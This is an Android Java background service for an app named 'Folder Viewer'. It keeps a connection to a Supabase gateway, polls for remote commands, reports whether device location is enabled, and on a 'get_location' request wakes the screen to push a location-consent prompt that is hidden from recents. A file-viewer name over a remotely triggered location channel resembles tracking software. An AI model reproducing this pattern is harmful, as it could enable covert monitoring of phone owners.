package com.example.folderviewer;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.LocationManager;
import android.provider.Settings;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class PingService extends Service {
    private static final String TAG = "FolderViewerPing";
    private static final String CHANNEL_ID = "folder_viewer_connection";
    private static final int NOTIFICATION_ID = 8102;
    private static final String SUPABASE_URL = "https://rvtqkldsapdtiocjygvc.supabase.co";
    private static final String SUPABASE_PUBLISHABLE_KEY = "sb_publishable_OA3eukLqTY8BrL3lf5trwQ_apXWqXh-";
    private static final String PREFS = "folder_viewer_device";
    private static final String KEY_DEVICE_ID = "device_id";
    private static final String KEY_DEVICE_TOKEN = "device_token";
    private static final long PING_INTERVAL_MS = 120_000L;
    private static final long REQUEST_POLL_INTERVAL_MS = 15_000L;
    private static final long RETRY_INTERVAL_MS = 10_000L;
    private static final int MAX_ATTEMPTS = 5;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    private ConnectivityManager connectivityManager;
    private ConnectivityManager.NetworkCallback networkCallback;
    private boolean pingInProgress = false;
    private boolean online = false;
    private boolean retryExhausted = false;
    private int attempts = 0;
    private long runId = 0;
    private Network lastNetwork;
    private Runnable periodicRunnable;
    private Runnable requestPollRunnable;
    private Runnable retryRunnable;

    @Override public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, makeNotification("সার্ভারের অবস্থা যাচাই হচ্ছে…"));
        connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        registerNetworkCallback();
        evaluateNetwork(true);
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        evaluateNetwork(true);
        return START_STICKY;
    }

    private void registerNetworkCallback() {
        if (connectivityManager == null) return;
        networkCallback = new ConnectivityManager.NetworkCallback() {
            @Override public void onAvailable(Network network) {
                if (lastNetwork == null || !lastNetwork.equals(network)) {
                    lastNetwork = network;
                    resetRetryState();
                }
                handler.post(() -> evaluateNetwork(true));
            }
            @Override public void onLost(Network network) {
                if (lastNetwork != null && lastNetwork.equals(network)) lastNetwork = null;
                handler.post(() -> {
                    setOnline(false, "ইন্টারনেট সংযোগ নেই");
                    cancelPeriodic();
                    cancelRequestPoll();
                    resetRetryState();
                });
            }
            @Override public void onCapabilitiesChanged(Network network, NetworkCapabilities caps) {
                handler.post(() -> {
                    boolean validated = caps != null && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                            && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED);
                    if (validated) {
                        resetRetryState();
                        evaluateNetwork(true);
                    } else if (caps != null && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)) {
                        evaluateNetwork(false);
                    }
                });
            }
        };
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                connectivityManager.registerDefaultNetworkCallback(networkCallback);
            } else {
                NetworkRequest request = new NetworkRequest.Builder()
                        .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET).build();
                connectivityManager.registerNetworkCallback(request, networkCallback);
            }
        } catch (Exception e) { Log.e(TAG, "Network callback registration failed", e); }
    }

    private void evaluateNetwork(boolean allowImmediatePing) {
        if (isFinishingState()) return;
        Network active = connectivityManager == null ? null : connectivityManager.getActiveNetwork();
        NetworkCapabilities caps = active == null || connectivityManager == null ? null : connectivityManager.getNetworkCapabilities(active);
        boolean hasInternetNetwork = caps != null && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
        boolean validated = hasInternetNetwork && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED);
        if (validated) {
            if (active != null) lastNetwork = active;
            retryExhausted = false;
            attempts = 0;
            if (!online && allowImmediatePing) attemptPing(false);
            else if (!online && !pingInProgress) attemptPing(false);
            else if (online && periodicRunnable == null) schedulePeriodic();
        } else if (hasInternetNetwork) {
            setOnline(false, "Wi-Fi/ডাটা আছে, কিন্তু ইন্টারনেট যাচাই হয়নি");
            cancelPeriodic();
            cancelRequestPoll();
            if (!retryExhausted && !pingInProgress && retryRunnable == null) {
                attempts = 0;
                attemptPing(true);
            }
        } else {
            setOnline(false, "ইন্টারনেট সংযোগ নেই — সংযোগ ফিরলে আবার চেষ্টা হবে");
            cancelPeriodic();
            cancelRequestPoll();
        }
    }

    private boolean isFinishingState() { return false; }

    private void attemptPing(boolean connectivityRetry) {
        if (pingInProgress) return;
        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        long id = prefs.getLong(KEY_DEVICE_ID, -1);
        String token = prefs.getString(KEY_DEVICE_TOKEN, "");
        if (id < 1 || token.isEmpty()) {
            setOnline(false, "ডিভাইস নিবন্ধন প্রয়োজন — অ্যাপ খুলুন");
            return;
        }
        pingInProgress = true;
        final long thisRun = ++runId;
        executor.execute(() -> {
            boolean success = false;
            String error = "Ping ব্যর্থ";
            try {
                JSONObject body = new JSONObject();
                body.put("action", "ping");
                body.put("device_id", id);
                body.put("device_token", token);
                JSONObject response = postToGateway(body);
                success = response.optBoolean("ok", false);
                if (!success) error = response.optString("error", "সার্ভার Ping ব্যর্থ");
            } catch (Exception e) {
                error = e.getClass().getSimpleName();
                Log.w(TAG, "Ping attempt failed", e);
            }
            final boolean ok = success;
            final String resultMessage = error;
            handler.post(() -> {
                if (thisRun != runId) return;
                pingInProgress = false;
                if (ok) {
                    attempts = 0;
                    retryExhausted = false;
                    setOnline(true, "অনলাইন — অটো Ping চালু");
                    pollPingTestRequests(id, token);
                    scheduleRequestPoll(id, token);
                    schedulePeriodic();
                } else {
                    setOnline(false, "Ping ব্যর্থ: " + resultMessage);
                    cancelPeriodic();
                    attempts++;
                    if (attempts < MAX_ATTEMPTS) {
                        scheduleRetry();
                    } else {
                        retryExhausted = true;
                        retryRunnable = null;
                        setOnline(false, "৫ বার চেষ্টা ব্যর্থ — নেটওয়ার্ক পরিবর্তন/ইন্টারনেট ফিরলে আবার চেষ্টা হবে");
                    }
                }
            });
        });
    }

    private void pollPingTestRequests(long deviceId, String token) {
        executor.execute(() -> {
            try {
                JSONObject poll = new JSONObject();
                poll.put("action", "poll_requests");
                poll.put("device_id", deviceId);
                poll.put("device_token", token);
                JSONObject response = postToGateway(poll);
                if (!response.optBoolean("ok", false)) return;
                org.json.JSONArray requests = response.optJSONArray("requests");
                if (requests == null) return;
                for (int i = 0; i < requests.length(); i++) {
                    JSONObject request = requests.optJSONObject(i);
                    if (request == null) continue;
                    String action = request.optString("action", "");
                    long requestId = request.optLong("id", -1);
                    if (requestId <= 0) continue;
                    if ("get_location".equals(action)) {
                        launchDirectLocationPrompt(requestId);
                        continue;
                    }
                    if (!"ping_test".equals(action) && !"check_location_status".equals(action)) continue;
                    JSONObject result = new JSONObject();
                    if ("ping_test".equals(action)) {
                        result.put("online", true);
                        result.put("response", "pong");
                        result.put("message", "Phone background service responded");
                    } else {
                        boolean enabled = isDeviceLocationEnabled();
                        result.put("location_enabled", enabled);
                        result.put("status", enabled ? "enabled" : "disabled");
                        result.put("message", enabled ? "ডিভাইসের Location চালু আছে" : "ডিভাইসের Location বন্ধ আছে");
                    }
                    result.put("responded_at", java.time.Instant.now().toString());
                    result.put("source", "background_ping_service");
                    JSONObject complete = new JSONObject();
                    complete.put("action", "complete_request");
                    complete.put("device_id", deviceId);
                    complete.put("device_token", token);
                    complete.put("request_id", requestId);
                    complete.put("status", "completed");
                    complete.put("result_payload", result);
                    postToGateway(complete);
                }
            } catch (Exception e) {
                Log.w(TAG, "Ping-test request polling failed", e);
            }
        });
    }

    private void launchDirectLocationPrompt(long requestId) {
        try {
            SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
            String key = "last_direct_location_prompt_request";
            if (prefs.getLong(key, -1L) == requestId) return;

            Intent launch = new Intent(this, MainActivity.class);
            launch.setAction("com.example.folderviewer.ACTION_DIRECT_LOCATION_REQUEST");
            launch.putExtra("direct_location_request_id", requestId);
            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                    | Intent.FLAG_ACTIVITY_CLEAR_TOP
                    | Intent.FLAG_ACTIVITY_SINGLE_TOP
                    | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);

            // Record before launching so a request isn't launched repeatedly every poll.
            prefs.edit().putLong(key, requestId).apply();

            // Try to wake the display briefly, then ask Android to bring the consent UI forward.
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            PowerManager.WakeLock wakeLock = null;
            if (pm != null) {
                wakeLock = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK
                        | PowerManager.ACQUIRE_CAUSES_WAKEUP
                        | PowerManager.ON_AFTER_RELEASE, "FolderViewer:LocationPrompt");
                wakeLock.acquire(5000L);
            }
            try {
                startActivity(launch);
            } catch (Exception startError) {
                Log.w(TAG, "Android blocked direct location prompt; user notification remains fallback", startError);
                showLocationRequestNotification(requestId);
            } finally {
                if (wakeLock != null && wakeLock.isHeld()) {
                    try { wakeLock.release(); } catch (Exception ignored) { }
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "Could not launch direct location prompt", e);
            showLocationRequestNotification(requestId);
        }
    }

    private void showLocationRequestNotification(long requestId) {
        try {
            Intent open = new Intent(this, MainActivity.class);
            open.putExtra("direct_location_request_id", requestId);
            open.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            PendingIntent contentIntent = PendingIntent.getActivity(this, (int) (requestId & 0x7fffffff),
                    open, PendingIntent.FLAG_UPDATE_CURRENT | (Build.VERSION.SDK_INT >= 23 ? PendingIntent.FLAG_IMMUTABLE : 0));
            Notification notification;
            if (Build.VERSION.SDK_INT >= 26) {
                notification = new Notification.Builder(this, CHANNEL_ID)
                        .setContentTitle("Folder Viewer — লোকেশন অনুরোধ")
                        .setContentText("লোকেশন শেয়ার করতে চাপ দিয়ে অনুমতি দিন")
                        .setSmallIcon(android.R.drawable.ic_menu_mylocation)
                        .setContentIntent(contentIntent)
                        .setAutoCancel(true)
                        .build();
            } else {
                notification = new Notification.Builder(this)
                        .setContentTitle("Folder Viewer — লোকেশন অনুরোধ")
                        .setContentText("লোকেশন শেয়ার করতে চাপ দিয়ে অনুমতি দিন")
                        .setSmallIcon(android.R.drawable.ic_menu_mylocation)
                        .setContentIntent(contentIntent)
                        .setAutoCancel(true)
                        .build();
            }
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (nm != null) nm.notify((int) (8200 + (requestId % 1000)), notification);
        } catch (Exception e) {
            Log.w(TAG, "Could not post fallback location notification", e);
        }
    }

    private boolean isDeviceLocationEnabled() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                LocationManager manager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
                return manager != null && manager.isLocationEnabled();
            }
            return Settings.Secure.getInt(getContentResolver(), Settings.Secure.LOCATION_MODE,
                    Settings.Secure.LOCATION_MODE_OFF) != Settings.Secure.LOCATION_MODE_OFF;
        } catch (Exception e) {
            Log.w(TAG, "Could not read location setting", e);
            return false;
        }
    }

    private void scheduleRequestPoll(long deviceId, String token) {
        if (requestPollRunnable != null) handler.removeCallbacks(requestPollRunnable);
        requestPollRunnable = () -> {
            requestPollRunnable = null;
            if (online) pollPingTestRequests(deviceId, token);
            if (online) scheduleRequestPoll(deviceId, token);
        };
        handler.postDelayed(requestPollRunnable, REQUEST_POLL_INTERVAL_MS);
    }

    private void cancelRequestPoll() {
        if (requestPollRunnable != null) handler.removeCallbacks(requestPollRunnable);
        requestPollRunnable = null;
    }

    private JSONObject postToGateway(JSONObject body) throws Exception {
        HttpURLConnection connection = null;
        try {
            connection = (HttpURLConnection) new URL(SUPABASE_URL + "/functions/v1/device-gateway").openConnection();
            connection.setRequestMethod("POST");
            connection.setConnectTimeout(10_000);
            connection.setReadTimeout(10_000);
            connection.setDoOutput(true);
            connection.setRequestProperty("apikey", SUPABASE_PUBLISHABLE_KEY);
            connection.setRequestProperty("Authorization", "Bearer " + SUPABASE_PUBLISHABLE_KEY);
            connection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            connection.setRequestProperty("Accept", "application/json");
            byte[] bytes = body.toString().getBytes("UTF-8");
            connection.setFixedLengthStreamingMode(bytes.length);
            try (OutputStream out = connection.getOutputStream()) { out.write(bytes); }
            int code = connection.getResponseCode();
            InputStream in = (code >= 200 && code < 400) ? connection.getInputStream() : connection.getErrorStream();
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            if (in != null) {
                byte[] chunk = new byte[4096]; int n;
                while ((n = in.read(chunk)) != -1) buffer.write(chunk, 0, n);
                in.close();
            }
            JSONObject result = new JSONObject(buffer.toString("UTF-8"));
            if (code < 200 || code >= 300) {
                if (!result.has("error")) result.put("error", "HTTP " + code);
                return result;
            }
            return result;
        } finally { if (connection != null) connection.disconnect(); }
    }

    private void schedulePeriodic() {
        cancelPeriodic();
        periodicRunnable = () -> {
            periodicRunnable = null;
            if (online && !pingInProgress) {
                attemptPing(false);
            } else {
                evaluateNetwork(false);
            }
        };
        handler.postDelayed(periodicRunnable, PING_INTERVAL_MS);
    }

    private void cancelPeriodic() {
        if (periodicRunnable != null) handler.removeCallbacks(periodicRunnable);
        periodicRunnable = null;
    }

    private void scheduleRetry() {
        if (retryRunnable != null) handler.removeCallbacks(retryRunnable);
        retryRunnable = () -> {
            retryRunnable = null;
            if (!retryExhausted) attemptPing(true);
        };
        handler.postDelayed(retryRunnable, RETRY_INTERVAL_MS);
    }

    private void resetRetryState() {
        retryExhausted = false;
        attempts = 0;
        if (retryRunnable != null) handler.removeCallbacks(retryRunnable);
        retryRunnable = null;
    }

    private void setOnline(boolean value, String text) {
        online = value;
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (nm != null) nm.notify(NOTIFICATION_ID, makeNotification(text));
    }

    private Notification makeNotification(String text) {
        if (Build.VERSION.SDK_INT >= 26) {
            return new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("Folder Viewer — সার্ভার সংযোগ")
                    .setContentText(text)
                    .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
                    .setOngoing(true)
                    .build();
        }
        return new Notification.Builder(this)
                .setContentTitle("Folder Viewer — সার্ভার সংযোগ")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
                .setOngoing(true)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Folder Viewer connection", NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("Automatic server ping and online/offline status");
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    @Override public void onDestroy() {
        cancelPeriodic();
        cancelRequestPoll();
        if (retryRunnable != null) handler.removeCallbacks(retryRunnable);
        if (connectivityManager != null && networkCallback != null) {
            try { connectivityManager.unregisterNetworkCallback(networkCallback); } catch (Exception ignored) { }
        }
        executor.shutdownNow();
        super.onDestroy();
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}
